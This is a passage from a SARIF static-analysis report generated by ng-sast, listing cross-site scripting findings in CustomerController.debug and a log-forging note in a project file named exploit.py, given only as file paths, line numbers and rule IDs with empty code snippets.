                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 163
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 161
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 160
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 281
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "92945afd33d1debef46a43dd60c286ba366ef5730f12f246da094c5fe021e88b"
          },
          "ruleId": "attacker-to-html",
          "ruleIndex": 12
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via `customerId` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via customerId in CustomerController.debug"
          },
          "level": "error",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 160
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "CRITICAL",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 281
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 23
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 306
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 159
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 161
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 160
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "12e2ef527f17c315cbf28484e05458628face0050b1c475fd4d2cdfa4e0e790c"
          },
          "ruleId": "attacker-to-html",
          "ruleIndex": 12
        },
        {
          "message": {
            "markdown": "Log Forging: External Data is Written Directly to Log in `exploit.py`",
            "text": "Log Forging: External Data is Written Directly to Log in exploit.py"
          },
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 14
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/exploits/JavaSerializationExploit/src/main/java/exploit.py"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "LOW",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 13
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/exploits/JavaSerializationExploit/src/main/java/exploit.py"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 14
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/exploits/JavaSerializationExploit/src/main/java/exploit.py"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "c7dce6e045a446ce1e52649616f368884347d1575d0c56b50dda2095fb2080ff"
          },
          "ruleId": "http-to-log",
          "ruleIndex": 13
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via `tin` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via tin in CustomerController.debug"
          },
          "level": "error",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 281
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "CRITICAL",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 288
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 297
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 20
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 29
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 306
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 159
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 163
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 161
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 160
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 281
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "ca80f9d0c03e7d53957a29f63992b8e71915b292d2b4e2fa3361880169b896c4"
          },
          "ruleId": "attacker-to-html",
          "ruleIndex": 12
        }
      ],
      "automationDetails": {
        "description": {
          "text": "Static Analysis Security Test results using ng-sast"
        },
        "guid": "78f83fd4-81d2-4d6d-9052-af9b45794a36"
      },
      "versionControlProvenance": [
        {
          "branch": "",
          "repositoryUri": "",
          "revisionId": ""
        }
      ]
    }
  ],
  "version": "2.1.0",
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "inlineExternalProperties": [
    {
      "guid": "78f83fd4-81d2-4d6d-9052-af9b45794a36",
      "runGuid": "cdef47de-489f-472a-b60c-9270c391b496"
    }
  ]
}